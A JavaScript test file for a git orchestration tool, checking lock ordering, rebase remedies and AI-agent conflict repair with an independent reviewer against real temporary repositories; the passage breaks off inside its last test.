// design §12: the lock scheme every remedy builds on (P6 split 1/4). No
// remedy executor exists yet (integration-repair.js lands in a later split),
// so this exercises the real primitives in src/lock.js directly — no
// stubbed git — against real lock files in real temp dirs.
import { test } from "node:test";
import assert from "node:assert/strict";
import { existsSync, mkdtempSync, writeFileSync, readFileSync, mkdirSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { acquireLock, releaseLock, LOCK_NAMES } from "../src/lock.js";
import { chooseRemedy } from "../src/failure.js";
import { runUntil } from "../src/run-controller.js";
import { inspect } from "../src/readiness.js";
import { createRebaseRemedy } from "../src/remedies.js";
import { integrationRepairRemedy, createIntegrationRepairRemedy } from "../src/integration-repair.js";
import * as git from "../src/git.js";

const READY_POLICY = { until: "ready", pollSeconds: 1, ciWaitMinutes: 1, maxAttempts: 3 };
const HEAD = "a".repeat(40);

function newRepo() {
  const repo = mkdtempSync(join(tmpdir(), "orch-remedy-git-"));
  git.git(["init", "-b", "main"], repo);
  git.git(["config", "user.email", "t@t"], repo);
  git.git(["config", "user.name", "t"], repo);
  writeFileSync(join(repo, "base.txt"), "base\n");
  git.git(["add", "."], repo);
  git.git(["commit", "-m", "base"], repo);
  mkdirSync(join(repo, ".orch", "wt"), { recursive: true });
  return repo;
}

function commitFile(repo, file, text, message) {
  writeFileSync(join(repo, file), text);
  git.git(["add", "."], repo);
  git.git(["commit", "-m", message], repo);
}

function addOrigin(repo) {
  const remote = mkdtempSync(join(tmpdir(), "orch-remedy-remote-"));
  git.git(["init", "--bare", "-b", "main"], remote);
  git.git(["remote", "add", "origin", remote], repo);
  git.git(["push", "-u", "origin", "main"], repo);
  return remote;
}

function cloneRemote(remote) {
  const parent = mkdtempSync(join(tmpdir(), "orch-remedy-peer-"));
  const peer = join(parent, "repo");
  git.git(["clone", remote, peer], parent);
  git.git(["config", "user.email", "t@t"], peer);
  git.git(["config", "user.name", "t"], peer);
  return peer;
}

function readyDeps(repo, failure, remedy) {
  return {
    runCycle: async () => failure,
    resolveLanded: () => ({
      pr: { number: 9, url: "https://github.com/o/r/pull/9" },
      expectedHead: HEAD,
      landing: "standing",
      branch: "orch/integration",
    }),
    gh: (args) => {
      if (args[0] === "pr" && args[1] === "view") {
        return JSON.stringify({
          number: 9, state: "OPEN", isDraft: false, headRefOid: HEAD,
          baseRefName: "main", mergeable: "MERGEABLE", mergeStateStatus: "CLEAN",
          reviewDecision: null, statusCheckRollup: [],
        });
      }
      if (args[0] === "api") return "[]";
      throw new Error(`unexpected gh call: ${args.join(" ")}`);
    },
    git,
    repo,
    remedies: { rebase: remedy },
  };
}

function remedyFor(repo, { branch = "feature", author = null, cycle = { status: "merged" }, gitOverrides = {}, lock = null } = {}) {
  const orchDir = join(repo, ".orch");
  const run = {
    repo,
    orchDir,
    branch,
    author: { agent: "author" },
    authorName: "author",
    cfg: { baseBranch: "main", integrationBranch: "orch/integration" },
    worktree: join(orchDir, "wt", "cycle-feature"),
  };
  const deps = {
    git: { ...git, ...gitOverrides },
    adapters: { get: () => author || { author: async () => {} } },
    ...(lock ? { lock } : {}),
  };
  return createRebaseRemedy({ run, deps, runCycle: async () => cycle });
}

test("rebase is the first dispatched remedy for all four landing/test classes", () => {
  for (const cls of ["LAND_DIRTY_MERGE", "LAND_OVERLAP", "LAND_HEAD_MOVED", "TEST_RED"]) {
    const retries = ["LAND_OVERLAP", "LAND_HEAD_MOVED"].includes(cls) ? { [cls]: 1 } : {};
    const decision = chooseRemedy(
      { class: cls, fingerprint: `${cls}-fp` },
      { attempt: 0, retries, failures: [] },
      READY_POLICY,
    );
    assert.equal(decision.remedy, "rebase", cls);
  }
});

test("rebase remedy uses the real integration branch and returns a fresh cycle", async () => {
  const repo = newRepo();
  git.git(["switch", "-c", "feature"], repo);
  commitFile(repo, "feature.txt", "feature\n", "feature change");
  git.git(["switch", "main"], repo);
  git.git(["switch", "-c", "orch/integration"], repo);
  commitFile(repo, "landed.txt", "landed\n", "landed on integration");
  git.git(["switch", "main"], repo);

  const failure = { status: "merge-deferred", class: "TEST_RED", fingerprint: "test-red-fp" };
  const result = await runUntil(
    READY_POLICY,
    {},
    readyDeps(repo, failure, remedyFor(repo)),
  );

  assert.equal(result.state, "READY");
  assert.equal(result.attempt, 1);
  assert.equal(git.git(["merge-base", "--is-ancestor", "orch/integration", "feature"], repo), "");
  assert.equal(git.git(["show", "feature:landed.txt"], repo), "landed");
  assert.equal(result.cycleResults.length, 2);
});

test("TEST_RED rebase runs the repair author even without a merge conflict", async () => {
  const repo = newRepo();
  git.git(["switch", "-c", "feature"], repo);
  commitFile(repo, "feature.txt", "feature\n", "feature change");
  git.git(["switch", "main"], repo);
  git.git(["switch", "-c", "orch/integration"], repo);
  commitFile(repo, "landed.txt", "landed\n", "landed on integration");
  git.git(["switch", "main"], repo);

  const author = {
    async author(_prompt, worktree) {
      writeFileSync(join(worktree, "repair.txt"), "repaired\n");
      git.git(["add", "repair.txt"], worktree);
      git.git(["commit", "-m", "repair failing test"], worktree);
    },
  };
  const failure = { status: "merge-deferred", class: "TEST_RED", fingerprint: "test-red-fp" };
  const result = await runUntil(
    READY_POLICY,
    {},
    readyDeps(repo, failure, remedyFor(repo, { author })),
  );

  assert.equal(result.state, "READY");
  assert.equal(git.git(["show", "feature:repair.txt"], repo), "repaired");
  assert.equal(result.cycleResults.length, 2);
});

test("rebase remedy refreshes a stale integration branch from origin", async () => {
  const repo = newRepo();
  const remote = addOrigin(repo);
  git.git(["switch", "-c", "feature"], repo);
  commitFile(repo, "feature.txt", "feature\n", "feature change");
  git.git(["switch", "main"], repo);
  git.git(["switch", "-c", "orch/integration"], repo);
  commitFile(repo, "landed.txt", "landed\n", "landed on integration");
  git.git(["push", "-u", "origin", "orch/integration"], repo);
  git.git(["switch", "main"], repo);

  const peer = cloneRemote(remote);
  git.git(["switch", "orch/integration"], peer);
  commitFile(peer, "remote-landed.txt", "remote\n", "remote integration change");
  git.git(["push", "origin", "orch/integration"], peer);

  const failure = { status: "merge-deferred", class: "LAND_DIRTY_MERGE", fingerprint: "origin-fp" };
  const result = await runUntil(
    READY_POLICY,
    {},
    readyDeps(repo, failure, remedyFor(repo)),
  );

  assert.equal(result.state, "READY");
  assert.equal(git.git(["show", "feature:remote-landed.txt"], repo), "remote");
});

test("rebase refreshes integration under merge.lock before rebasing", async () => {
  const repo = newRepo();
  git.git(["switch", "-c", "feature"], repo);
  commitFile(repo, "feature.txt", "feature\n", "feature change");
  git.git(["switch", "main"], repo);
  git.git(["switch", "-c", "orch/integration"], repo);
  commitFile(repo, "landed.txt", "landed\n", "landed on integration");
  git.git(["switch", "main"], repo);

  const calls = [];
  const lock = {
    async acquireBlocking(_dir, name) { calls.push(["acquire", name]); return true; },
    releaseLock(_dir, name) { calls.push(["release", name]); },
  };
  const failure = { status: "merge-deferred", class: "LAND_DIRTY_MERGE", fingerprint: "lock-fp" };
  await runUntil(
    READY_POLICY,
    {},
    readyDeps(repo, failure, remedyFor(repo, {
      lock,
      gitOverrides: {
        ensureIntegrationWorktree(...args) {
          calls.push(["ensure", calls.at(-1)?.[1]]);
          return git.ensureIntegrationWorktree(...args);
        },
        reconcileIntegrationToOrigin(...args) {
          calls.push(["reconcile", calls.at(-1)?.[1]]);
          return git.reconcileIntegrationToOrigin(...args);
        },
      },
    })),
  );
  assert.deepEqual(calls.slice(0, 4), [
    ["acquire", "merge.lock"],
    ["ensure", "merge.lock"],
    ["reconcile", "merge.lock"],
    ["release", "merge.lock"],
  ]);
});

test("an executed rebase failure keeps the consumed attempt", async () => {
  const repo = newRepo();
  git.git(["switch", "-c", "feature"], repo);
  commitFile(repo, "feature.txt", "feature\n", "feature change");
  git.git(["switch", "main"], repo);
  git.git(["switch", "-c", "orch/integration"], repo);
  git.git(["switch", "main"], repo);

  const failure = { status: "merge-deferred", class: "LAND_DIRTY_MERGE", fingerprint: "executed-fp" };
  const result = await runUntil(
    READY_POLICY,
    {},
    readyDeps(repo, failure, remedyFor(repo, {
      gitOverrides: { rebaseBranchOnto: () => ({ ok: false, reason: "unmerged paths unreadable", executed: true }) },
    })),
  );
  assert.equal(result.attempt, 1);
  assert.match(result.reason, /unmerged paths unreadable/);
});

test("rebase remedy preserves a conflict for the author, then finishes the real rebase", async () => {
  const repo = newRepo();
  git.git(["switch", "-c", "feature"], repo);
  commitFile(repo, "a.txt", "feature\n", "feature change");
  git.git(["switch", "main"], repo);
  git.git(["switch", "-c", "orch/integration"], repo);
  commitFile(repo, "a.txt", "integration\n", "landed conflicting change");
  git.git(["switch", "main"], repo);

  const prompts = [];
  const author = {
    async author(prompt, worktree) {
      prompts.push({ prompt, worktree });
      assert.equal(existsSync(worktree), true);
      writeFileSync(join(worktree, "a.txt"), "repaired\n");
      git.git(["add", "-A"], worktree);
      git.git(["commit", "-m", "repair rebase conflict"], worktree);
    },
  };
  const failure = { status: "merge-deferred", class: "LAND_DIRTY_MERGE", fingerprint: "dirty-fp" };
  const result = await runUntil(
    READY_POLICY,
    {},
    readyDeps(repo, failure, remedyFor(repo, { author })),
  );

  assert.equal(result.state, "READY");
  assert.equal(result.attempt, 1);
  assert.equal(prompts.length, 1);
  assert.match(prompts[0].prompt, /Failure class: LAND_DIRTY_MERGE/);
  assert.match(prompts[0].prompt, /a\.txt/);
  assert.match(prompts[0].prompt, /run the relevant tests yourself/i);
  assert.match(prompts[0].prompt, /do not widen scope/i);
  assert.equal(git.git(["show", "feature:a.txt"], repo), "repaired");
  assert.equal(git.git(["merge-base", "--is-ancestor", "orch/integration", "feature"], repo), "");
  assert.equal(existsSync(join(repo, ".orch", "wt", "rebase-feature")), false);
});

test("rebase remedy reports a missing branch and restores the consumed attempt", async () => {
  const repo = newRepo();
  const failure = { status: "merge-deferred", class: "LAND_DIRTY_MERGE", fingerprint: "missing-fp" };
  const result = await runUntil(
    READY_POLICY,
    {},
    readyDeps(repo, failure, remedyFor(repo, { branch: "missing" })),
  );

  assert.equal(result.state, "STOPPED_AT_CAP");
  assert.equal(result.attempt, 0);
  assert.match(result.reason, /branch missing does not exist/);
  assert.equal(existsSync(join(repo, ".orch", "wt", "rebase-missing")), false);
});

test("§12 lock order: acquiring a righthand lock while holding a lefthand one is legal", () => {
  const d = mkdtempSync(join(tmpdir(), "orch-remedies-"));
  assert.equal(acquireLock(d, LOCK_NAMES.STANDING_PR), true);
  assert.equal(acquireLock(d, LOCK_NAMES.MERGE), true); // standing-pr.lock -> merge.lock: legal
  releaseLock(d, LOCK_NAMES.MERGE);
  releaseLock(d, LOCK_NAMES.STANDING_PR);
});

test("§12 lock order: acquiring a lefthand lock while holding a righthand one throws", () => {
  const d = mkdtempSync(join(tmpdir(), "orch-remedies-"));
  assert.equal(acquireLock(d, LOCK_NAMES.MERGE), true);
  assert.throws(
    () => acquireLock(d, LOCK_NAMES.STANDING_PR),
    /lock order violation/,
    "merge.lock -> standing-pr.lock is the reverse of §12's order and must be rejected, not silently allowed",
  );
  releaseLock(d, LOCK_NAMES.MERGE);
});

test("integration-repair.lock: a losing peer's acquire returns false synchronously, not an acquireBlocking() promise", () => {
  const d = mkdtempSync(join(tmpdir(), "orch-remedies-"));
  assert.equal(acquireLock(d, LOCK_NAMES.INTEGRATION_REPAIR), true); // winner
  const lostRace = acquireLock(d, LOCK_NAMES.INTEGRATION_REPAIR); // loser: plain acquireLock, not acquireBlocking
  assert.equal(lostRace, false); // a Promise (acquireBlocking's return) fails this equality, not just resolves falsy
  releaseLock(d, LOCK_NAMES.INTEGRATION_REPAIR);
});

test("§12 lock order: integration-repair.lock -> merge.lock is legal (the repair ff/push edge, 'not optional')", () => {
  const d = mkdtempSync(join(tmpdir(), "orch-remedies-"));
  assert.equal(acquireLock(d, LOCK_NAMES.INTEGRATION_REPAIR), true);
  assert.equal(acquireLock(d, LOCK_NAMES.MERGE), true); // nested merge.lock while still holding integration-repair.lock
  releaseLock(d, LOCK_NAMES.MERGE);
  releaseLock(d, LOCK_NAMES.INTEGRATION_REPAIR);
});

test("§12 lock order: acquiring integration-repair.lock while holding merge.lock throws (reverse of the 'not optional' edge)", () => {
  const d = mkdtempSync(join(tmpdir(), "orch-remedies-"));
  assert.equal(acquireLock(d, LOCK_NAMES.MERGE), true);
  assert.throws(
    () => acquireLock(d, LOCK_NAMES.INTEGRATION_REPAIR),
    /lock order violation/,
    "merge.lock -> integration-repair.lock reverses §12's order and must be rejected",
  );
  releaseLock(d, LOCK_NAMES.MERGE);
});

test("§12 lock order: holding merge.lock in one orchDir does not block a lock acquire in an unrelated orchDir", () => {
  const a = mkdtempSync(join(tmpdir(), "orch-remedies-a-"));
  const b = mkdtempSync(join(tmpdir(), "orch-remedies-b-"));
  assert.equal(acquireLock(a, LOCK_NAMES.MERGE), true); // held in orchDir a
  assert.doesNotThrow(() => acquireLock(b, LOCK_NAMES.CYCLE)); // unrelated orchDir — independent lock namespace
  releaseLock(b, LOCK_NAMES.CYCLE);
  releaseLock(a, LOCK_NAMES.MERGE);
});

test("§12 lock order: a refused release clears the order-tracking entry too, not just a successful one", () => {
  const d = mkdtempSync(join(tmpdir(), "orch-remedies-"));
  const mergePath = join(d, LOCK_NAMES.MERGE);
  assert.equal(acquireLock(d, LOCK_NAMES.MERGE), true); // we believe we hold merge.lock (idx 3)
  writeFileSync(mergePath, String(process.pid + 1)); // simulate a steal: someone else now owns the file
  assert.equal(releaseLock(d, LOCK_NAMES.MERGE), false); // refused — not our pid
  // A stale idx-3 entry here would make this legitimate lower-order acquire
  // throw a spurious order violation even though we hold nothing.
  assert.doesNotThrow(() => acquireLock(d, LOCK_NAMES.STANDING_PR));
  releaseLock(d, LOCK_NAMES.STANDING_PR);
});

test("releaseLock ownership check: a cycle cannot release a lock it does not hold", () => {
  const d = mkdtempSync(join(tmpdir(), "orch-remedies-"));
  const lockPath = join(d, LOCK_NAMES.INTEGRATION_REPAIR);
  const peerPid = String(process.pid + 1); // not us; staleness is irrelevant since we never call acquireLock here
  writeFileSync(lockPath, peerPid);
  assert.equal(releaseLock(d, LOCK_NAMES.INTEGRATION_REPAIR), false);
  // the peer's lock survives untouched — a losing peer that (incorrectly)
  // tried to release it must not clear the way for a second resolver.
  assert.equal(readFileSync(lockPath, "utf8"), peerPid);
});

// ---------------------------------------------------------------------------
// Integration repair (design §10A, P6 split 4/4). Criterion 11 of the work
// order: the resolver path — the one carrying the agent, the security scan and
// the audit — is exercised against a REAL temporary repository with a real
// origin. A stubbed `git` cannot see the three fail-open defects below
// (auditing the pre-repair tip, self-review, committed conflict markers), which
// is precisely why they survived six review rounds.

function conflictFixture() {
  const repo = newRepo();
  const remote = addOrigin(repo);
  git.git(["switch", "-c", "orch/integration"], repo);
  commitFile(repo, "shared.txt", "integration side\n", "integration change");
  git.git(["push", "-u", "origin", "orch/integration"], repo);
  git.git(["switch", "main"], repo);
  commitFile(repo, "shared.txt", "base side\n", "base change");
  commitFile(repo, "package.json", '{"version":"9.9.9"}\n', "base version bump");
  git.git(["push", "origin", "main"], repo);
  // Drop the remote-tracking refs the pushes left behind: the repair must
  // fetch `origin/<branch>` itself (criterion 9), not ride a stale snapshot.
  git.gitTry(["update-ref", "-d", "refs/remotes/origin/orch/integration"], repo);
  return { repo, remote };
}

function repairCfg(overrides = {}) {
  return {
    baseBranch: "main",
    integrationBranch: "orch/integration",
    test: "auto",
    stageTimeout: 7,
    agents: ["resolver", "reviewer"],
    security: { ignore: [] },
    ...overrides,
    main: {
      conflictResolution: "auto",
      autoResolveConflicts: true,
      conflictResolutionResolvers: [{ agent: "resolver", model: null, effort: null }],
      autoResolveConflictPaths: ["CHANGELOG.md", "package-lock.json", "package.json"],
      ...(overrides.main || {}),
    },
  };
}

// Writes a real resolution and lets the adapter contract stand in for
// cli-adapter.js's captureAuthorWork: stage everything and commit.
function resolvingAgent(text = "resolved by the agent\n", file = "shared.txt") {
  const seen = [];
  return {
    seen,
    async author(_prompt, wd, opts) {
      seen.push({ stage: "author", stageTimeoutMs: opts?.stageTimeoutMs });
      writeFileSync(join(wd, file), text);
      git.git(["add", "-A"], wd);
      git.git(["commit", "-m", "resolve conflict"], wd);
    },
    async audit(branch, wd, opts) {
      seen.push({ stage: "audit", branch, stageTimeoutMs: opts?.stageTimeoutMs });
      return { decision: "AGREE", reason: "resolver self-approved", raw: "" };
    },
  };
}

function runRepair(repo, { cfg = repairCfg(), agents = {}, gh = () => "", branch = "orch/integration", landing = "standing", failureClass = "REMOTE_CONFLICTING", prNumber = 9, gitDep = git, sleep = async () => {}, record = { attempt: 1, failures: [] }, gate = { detect: () => "true", run: () => ({ pass: true, log: "" }) } } = {}) {
  return integrationRepairRemedy({
    name: "integration-repair",
    policy: { maxAttempts: 3 },
    failure: { class: failureClass, fingerprint: "fp" },
    record,
    cycle: { status: "merged" },
    run: { repo, orchDir: join(repo, ".orch"), sid: "sidtest", cfg },
    deps: {
      git: gitDep,
      gate,
      sleep,
      adapters: { get: (name) => agents[name] || { async author() {}, async audit() { return { decision: "AGREE" }; } } },
    },
    resolveLanded: () => ({ pr: { number: prNumber }, landing, branch }),
    gh,
  });
}

const originSha = (remote, branch) => git.git(["rev-parse", branch], remote);

test("integration repair: the audit reads the RESOLUTION, not the pre-repair branch tip", async () => {
  const { repo, remote } = conflictFixture();
  const before = originSha(remote, "orch/integration");
  // Reads through the ref it was handed. The pre-repair tip still says
  // "integration side", so auditing `refs/heads/orch/integration` — what a
  // --detach'ed scratch worktree would resolve — DISAGREEs.
  const audited = [];
  const reviewer = {
    async audit(branch, wd) {
      const shown = git.gitTry(["show", `${branch}:shared.txt`], wd);
      audited.push({ branch, content: shown.out });
      return shown.out.includes("resolved by the agent")
        ? { decision: "AGREE", reason: "read the resolution" }
        : { decision: "DISAGREE", reason: `audited stale content: ${shown.out.trim()}` };
    },
  };
  const out = await runRepair(repo, { agents: { resolver: resolvingAgent(), reviewer } });

  assert.equal(out.cycle?.status, "merged", out.result?.reason);
  assert.equal(audited.length, 1);
  assert.match(audited[0].content, /resolved by the agent/);
  assert.notEqual(originSha(remote, "orch/integration"), before);
  assert.equal(
    git.git(["show", "orch/integration:shared.txt"], remote),
    "resolved by the agent",
  );
});

test("integration repair: a single-agent pool never lets the resolver audit its own resolution", async () => {
  const { repo, remote } = conflictFixture();
  const before = originSha(remote, "orch/integration");
  const resolver = resolvingAgent();
  const cfg = repairCfg({ agents: ["resolver"] });
  const out = await runRepair(repo, { cfg, agents: { resolver } });

  assert.equal(out.cycle, undefined);
  assert.match(out.result.reason, /no conflict reviewer configured that differs from resolver/);
  assert.equal(resolver.seen.filter((s) => s.stage === "audit").length, 0, "the resolver must never be asked to audit itself");
  assert.equal(originSha(remote, "orch/integration"), before, "nothing may reach origin without an independent audit");
});

test("integration repair: a resolver that commits raw conflict markers is rejected before the push", async () => {
  const { repo, remote } = conflictFixture();
  const before = originSha(remote, "orch/integration");
  // `git add -A` + `git commit` SUCCEEDS mid-merge and commits the markers as
  // ordinary content — verified by this fixture, not assumed.
  const resolver = {
    async author(_prompt, wd) {
      git.git(["add", "-A"], wd);
      git.git(["commit", "-m", "pretend to resolve"], wd);
    },
  };
  let auditCalls = 0;
  const reviewer = { async audit() { auditCalls += 1; return { decision: "AGREE" }; } };
  const out = await runRepair(repo, { agents: { resolver, reviewer } });

  assert.equal(out.cycle, undefined);
  assert.match(out.result.reason, /conflict markers/);
  assert.equal(auditCalls, 0);
  assert.equal(originSha(remote, "orch/integration"), before);
});

test("integration repair: every agent stage carries the stageTimeout watchdog (#56/#58)", async () => {
  const { repo } = conflictFixture();
  const resolver = resolvingAgent();
  const seen = [];
  const reviewer = { async audit(_b, _wd, opts) { seen.push(opts?.stageTimeoutMs); return { decision: "AGREE" }; } };
  const out = await runRepair(repo, { agents: { resolver, reviewer } });

  assert.equal(out.cycle?.status, "merged", out.result?.reason);
  assert.deepEqual(resolver.seen.map((s) => s.stageTimeoutMs), [7 * 60_000]);
  assert.deepEqual(seen, [7 * 60_000]);
});

test("integration repair: conflictResolution manual runs no resolver at all", async () => {
  const { repo, remote } = conflictFixture();
  const before = originSha(remote, "orch/integration");
  const resolver = resolvingAgent();
  const cfg = repairCfg({ main: { conflictResolution: "manual", autoResolveConflicts: false } });
  const out = await runRepair(repo, { cfg, agents: { resolver, reviewer: resolvingAgent() } });

  assert.equal(out.cycle, undefined);
  assert.match(out.result.reason, /conflictResolution is manual/);
  assert.equal(resolver.seen.length, 0);
  assert.equal(originSha(remote, "orch/integration"), before);
});

test("integration repair: conflictResolution propose drafts a resolution but never pushes it", async () => {
  const { repo, remote } = conflictFixture();
  const before = originSha(remote, "orch/integration");
  const cfg = repairCfg({ main: { conflictResolution: "propose" } });
  const ghCalls = [];
  const out = await runRepair(repo, {
    cfg,
    agents: { resolver: resolvingAgent(), reviewer: { async audit() { return { decision: "AGREE" }; } } },
    gh: (args) => { ghCalls.push(args); return ""; },
  });

  assert.equal(out.cycle, undefined);
  assert.equal(out.result.failureClass, "REMOTE_REVIEW_REQUIRED");
  assert.equal(originSha(remote, "orch/integration"), before);
  assert.equal(ghCalls[0][0], "pr");
  assert.equal(ghCalls[0][1], "comment");
});

test("integration repair: an allowlisted path base also bumped is not a terminal protected-path block", async () => {
  const { repo, remote } = conflictFixture();
  const before = originSha(remote, "orch/integration");
  // `package.json` arrives purely from base's own incoming delta AND is an
  // operator `autoResolveConflictPaths` entry — running the protected-path
  // floor before the allowlist made every routine version bump terminal.
  const out = await runRepair(repo, {
    agents: { resolver: resolvingAgent(), reviewer: { async audit() { return { decision: "AGREE" }; } } },
  });

  assert.equal(out.cycle?.status, "merged", out.result?.reason);
  assert.notEqual(originSha(remote, "orch/integration"), before);
  assert.equal(git.git(["show", "orch/integration:package.json"], remote), '{"version":"9.9.9"}');
});

test("integration repair: a per-cycle PR repairs its own branch, not the integration branch", async () => {
  const { repo, remote } = conflictFixture();
  git.git(["switch", "-c", "feature", "orch/integration"], repo);
  git.git(["push", "-u", "origin", "feature"], repo);
  git.git(["switch", "main"], repo);
  const integrationBefore = originSha(remote, "orch/integration");

  const out = await runRepair(repo, {
    branch: "feature",
    agents: { resolver: resolvingAgent(), reviewer: { async audit() { return { decision: "AGREE" }; } } },
  });

  assert.equal(out.cycle?.status, "merged", out.result?.reason);
  assert.equal(git.git(["show", "feature:shared.txt"], remote), "resolved by the agent");
  assert.equal(originSha(remote, "orch/integration"), integrationBefore, "the integration branch must not be touched for a per-cycle PR");
});

// The per-cycle counterpart of the REMOTE_BEHIND reconcile assertion above.
// `resolveLanded` (cli.js) reads the LOCAL branch for readiness's
// `expectedHead`, and readiness rule 2 only re-pins a moved head for
// `landing: "standing"` — so a per-cycle repair that moves only origin comes
// back REMOTE_UNKNOWN forever. Driven with `landing: "pr"`, the only pairing
// `resolveLanded` actually produces for a per-cycle branch.
test("integration repair: a per-cycle repair leaves readiness ready, not REMOTE_UNKNOWN", async () => {
  const { repo, remote } = conflictFixture();
  git.git(["switch", "-c", "feature", "orch/integration"], repo);
  git.git(["push", "-u", "origin", "feature"], repo);
  git.git(["switch", "main"], repo);

  const out = await runRepair(repo, {
    branch: "feature",
    landing: "pr",
    agents: { resolver: resolvingAgent(), reviewer: { async audit() { return { decision: "AGREE" }; } } },
  });
  assert.equal(out.cycle?.status, "merged", out.result?.reason);

  const repaired = originSha(remote, "feature");
  const expectedHead = git.git(["rev-parse", "feature"], repo);
  assert.equal(expectedHead, repaired, "the local branch must follow the repaired tip");

  // What run-controller.js does next with that `expectedHead`.
  const gh = (args) => {
    if (args[0] === "pr" && args[1] === "view") {
      return JSON.stringify({
        number: 9, state: "OPEN", isDraft: false, headRefOid: repaired, baseRefName: "main",
        mergeable: "MERGEABLE", mergeStateStatus: "CLEAN", reviewDecision: null, statusCheckRollup: [],
      });
    }
    if (args[0] === "api") return "[]";
    throw new Error(`unexpected gh call: ${args.join(" ")}`);
  };
  const readiness = inspect(
    { pr: 9, expectedHead, landing: "pr", cfg: { baseBranch: "main", integrationBranch: "orch/integration" } },
    { gh, git, repo },
  );
  assert.equal(readiness.class, undefined, readiness.summary);
  assert.equal(readiness.ready, true);
});

test("integration repair: a per-cycle REMOTE_BEHIND advances the local branch too", async () => {
  const { repo, remote } = conflictFixture();
  git.git(["switch", "-c", "feature", "orch/integration"], repo);
  git.git(["push", "-u", "origin", "feature"], repo);
  git.git(["switch", "main"], repo);
  // GitHub's update-branch, played by a peer: merge base in server-side.
  const peer = cloneRemote(remote);
  git.git(["switch", "feature"], peer);
  git.git(["merge", "--no-edit", "-X", "theirs", "origin/main"], peer);
  const gh = (args) => {
    if (args[0] === "api") { git.git(["push", "origin", "feature"], peer); return "{}"; }
    return "";
  };

  const out = await runRepair(repo, { branch: "feature", landing: "pr", failureClass: "REMOTE_BEHIND", gh });

  assert.equal(out.cycle?.status, "merged", out.result?.reason);
  assert.equal(
    git.git(["rev-parse", "feature"], repo),
    originSha(remote, "feature"),
    "the local per-cycle branch must follow the server-side update too",
  );
});

test("integration repair: a per-cycle branch carrying local-only commits is not rewound by the repair", async () => {
  const { repo, remote } = conflictFixture();
  git.git(["switch", "-c", "feature", "orch/integration"], repo);
  git.git(["push", "-u", "origin", "feature"], repo);
  commitFile(repo, "local-only.txt", "not pushed\n", "local-only work");
  const diverged = git.git(["rev-parse", "feature"], repo);
  git.git(["switch", "main"], repo);

  const out = await runRepair(repo, {
    branch: "feature",
    landing: "pr",
    agents: { resolver: resolvingAgent(), reviewer: { async audit() { return { decision: "AGREE" }; } } },
  });

  assert.match(out.result.reason, /diverged from the repaired tip/);
  assert.equal(git.git(["rev-parse", "feature"], repo), diverged, "local commits must not be orphaned");
});

test("integration repair: a peer holding integration-repair.lock refunds the attempt and hands the cycle back to re-poll", async () => {
  const { repo } = conflictFixture();
  const orchDir = join(repo, ".orch");
  mkdirSync(orchDir, { recursive: true });
  writeFileSync(join(orchDir, LOCK_NAMES.INTEGRATION_REPAIR), String(process.pid + 0));
  const resolver = resolvingAgent();
  const slept = [];
  // A live PID (our own) makes the lock genuinely held, not stale.
  const out = await runRepair(repo, { agents: { resolver }, sleep: async (ms) => slept.push(ms) });

  // The cycle coming back (and no terminal `result`) is what makes
  // run-controller.js loop round and read readiness again after the peer
  // finishes, instead of ending the run on mere contention.
  assert.equal(out.cycle?.status, "merged");
  assert.equal(out.result, undefined);
  assert.equal(out.record.attempt, 0, "a repair that started nothing must not burn an attempt");
  assert.equal(resolver.seen.length, 0);
  assert.ok(slept[0] > 0, "back off before the re-poll so the peer's repair can land");
});

test("integration repair: the lock loser re-polls and repairs for real once the peer releases", async () => {
  // End to end through the REAL remedy: contention must put the controller back
  // on the readiness path, and the retry must then repair instead of ending the
  // run. The lock is released during the backoff, standing in for the peer
  // finishing its own repair.
  const { repo, remote } = conflictFixture();
  const orchDir = join(repo, ".orch");
  const lockFile = join(orchDir, LOCK_NAMES.INTEGRATION_REPAIR);
  writeFileSync(lockFile, String(process.pid));
  const before = originSha(remote, "orch/integration");

  const resolver = resolvingAgent();
  const cfg = repairCfg();
  const run = { repo, orchDir, sid: "sidtest", cfg };
  const land = { pr: { number: 9, url: "u" }, expectedHead: HEAD, landing: "standing", branch: "orch/integration" };
  let polls = 0;
  const gh = (args) => {
    if (args[0] === "api") return "[]";
    polls += 1;
    return JSON.stringify({
      number: 9, state: "OPEN", isDraft: false, headRefOid: HEAD,
      baseRefName: "main", mergeable: "MERGEABLE", mergeStateStatus: "CLEAN",
      reviewDecision: null,
      // Red until the resolver has actually repaired the branch.
      statusCheckRollup: [{ name: "ci", status: "COMPLETED", conclusion: resolver.seen.length ? "SUCCESS" : "FAILURE" }],
    });
  };
  const deps = {
    git,
    gate: { detect: () => "true", run: () => ({ pass: true, log: "" }) },
    adapters: { get: (name) => (name === "resolver" ? resolver : { async audit() { return { decision: "AGREE" }; } }) },
    sleep: async () => rmSync(lockFile),
  };

  const out = await runUntil(
    { ...READY_POLICY, integrationBranch: "orch/integration" },
    {},
    {
      runCycle: async () => ({ status: "merged" }),
      resolveLanded: () => land,
      gh,
      git,
      repo,
      remedies: { "integration-repair": createIntegrationRepairRemedy({ run, deps, gh, resolveLanded: () => land }) },
      sleep: async () => {},
    },
  );

  assert.equal(out.state, "READY", JSON.stringify(out));
  assert.equal(out.attempt, 1, "only the repair that ran burns an attempt");
  // `repair-lock` (failure.js) already grants 3 free re-polls before the remedy
  // is dispatched at all (polls 1-4); poll 5 follows the contended dispatch and
  // is the one this fix buys, poll 6 reads the repaired branch green.
  assert.ok(polls >= 5, `contention must add a readiness poll, not end the run (saw ${polls})`);
  assert.deepEqual(out.failures.map((f) => f.remedy), ["integration-repair"], "contention must not leave a convergence entry behind");
  assert.equal(resolver.seen.filter((e) => e.stage === "author").length, 1, "the retry must reach the resolver");
  assert.equal(out.cycleResults, undefined, "a handed-back cycle is not a new cycle result");
  assert.notEqual(originSha(remote, "orch/integration"), before, "the retry must actually repair");
});

test("integration repair: a dead resolver seat fails over to the next one on the retry", async () => {
  // End to end through the real remedy and the real controller: the retry can
  // only dispatch because the remedy gave back the convergence entry it never
  // earned (design §7 would otherwise skip the remedy at streak 2), and the
  // rotation cursor has already moved off the seat that threw.
  const { repo, remote } = conflictFixture();
  const seats = [];
  const dead = {
    async author() { seats.push("dead"); throw new Error("adapter exploded"); },
    async audit() { return { decision: "AGREE" }; },
  };
  const resolver = resolvingAgent();
  const before = originSha(remote, "orch/integration");
  const cfg = repairCfg({
    agents: ["dead", "resolver"],
    main: { conflictResolutionResolvers: [{ agent: "dead" }, { agent: "resolver" }] },
  });
  const run = { repo, orchDir: join(repo, ".orch"), sid: "sidtest", cfg };
  const land = { pr: { number: 9, url: "u" }, expectedHead: HEAD, landing: "standing", branch: "orch/integration" };
